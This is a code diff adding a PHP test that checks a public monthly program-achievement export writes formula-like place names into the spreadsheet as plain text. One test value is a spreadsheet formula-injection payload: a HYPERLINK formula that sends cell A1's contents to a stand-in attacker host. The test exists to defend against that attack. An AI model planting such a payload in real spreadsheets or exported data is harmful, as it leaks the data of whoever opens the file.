@@ -1049,4 +1049,37 @@ class CapaianPublikTest extends TestCase
             $this->assertTrue($rows[0]->hasAttribute('data-sort-fixed'), "Baris empty-state harus data-sort-fixed: {$query}");
         }
     }
+
+    public function test_public_export_writes_formula_like_names_as_text(): void
+    {
+        $hyperlink = '=HYPERLINK("http://evil.test/?x="&A1,"Klik")';
+        $this->d['lokasiB']->update(['nama_lokasi' => '=2+2']);
+        $this->d['kecA']->update(['kecamatan' => '=1+1']);
+        $this->d['desaA']->update(['desa' => $hyperlink]);
+        $this->d['desaB']->update(['desa' => '=1+1']);
+        Cache::flush();
+
+        // Export publik tanpa login
+        $response = $this->get('login/laporan/export?bulan='.$this->bulan)->assertOk()->assertDownload('capaian-program-'.$this->bulan.'.xlsx');
+        $ws = \PhpOffice\PhpSpreadsheet\IOFactory::load($response->baseResponse->getFile()->getPathname())->getActiveSheet();
+
+        $nama = [];
+        foreach ($ws->getRowIterator(3) as $row) {
+            foreach ($row->getCellIterator('A', 'C') as $cell) {
+                $this->assertNotSame(\PhpOffice\PhpSpreadsheet\Cell\DataType::TYPE_FORMULA, $cell->getDataType(), $cell->getCoordinate());
+            }
+            $a = $ws->getCell('A'.$row->getRowIndex());
+            if ($a->getValue() !== null) {
+                $nama[$a->getValue()] = [$a->getDataType(), $ws->getCell('B'.$row->getRowIndex())->getDataType()];
+            }
+        }
+
+        foreach (['=2+2', '=1+1', $hyperlink] as $teks) {
+            $this->assertArrayHasKey($teks, $nama, $teks);
+            $this->assertSame(\PhpOffice\PhpSpreadsheet\Cell\DataType::TYPE_STRING, $nama[$teks][0], $teks);
+        }
+        // Persen tetap numerik
+        $this->assertSame(\PhpOffice\PhpSpreadsheet\Cell\DataType::TYPE_NUMERIC, $nama['=1+1'][1]);
+        $this->assertSame(\PhpOffice\PhpSpreadsheet\Cell\DataType::TYPE_NUMERIC, $nama[$hyperlink][1]);
+    }
 }
